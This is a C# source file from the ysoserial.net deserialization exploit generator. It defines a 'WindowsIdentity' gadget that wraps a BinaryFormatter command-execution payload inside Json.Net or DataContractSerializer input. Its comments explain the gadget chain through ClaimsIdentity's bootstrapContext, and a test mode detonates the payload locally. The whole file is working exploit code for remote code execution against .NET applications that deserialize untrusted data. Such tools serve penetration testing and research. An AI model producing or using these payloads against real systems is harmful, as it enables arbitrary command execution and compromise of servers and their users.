﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Xml;
using Newtonsoft.Json;

namespace ysoserial.Generators
{
    class WindowsIdentityGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "WindowsIdentity Gadget by Levi Broderick";

            // Bridge from BinaryFormatter constructor/callback to BinaryFormatter
            // Usefule for Json.Net since it invokes ISerializable callbacks during deserialization

            // WindowsIdentity extends ClaimsIdentity
            // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references

            // System.Security.ClaimsIdentity.bootstrapContext is an SerializationInfo key (BootstrapContextKey)
            // added during serialization with binary formatter serialized Claims

            // protected ClaimsIdentity(SerializationInfo info, StreamingContext context)
            // private void Deserialize
            // using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(info.GetString(BootstrapContextKey))))
            //     m_bootstrapContext = bf.Deserialize(ms, null, false);
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net", "DataContractSerializer" };
        }

        public override string Name()
        {
            return "WindowsIdentity";
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false);
            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.ToLower().Equals("json.net"))
            {
                string payload = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    'System.Security.ClaimsIdentity.bootstrapContext': '" + b64encoded + @"'
                }";
                
                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        });
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
      <System.Security.ClaimsIdentity.bootstrapContext i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
       </WindowsIdentity>
</root>
";

                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
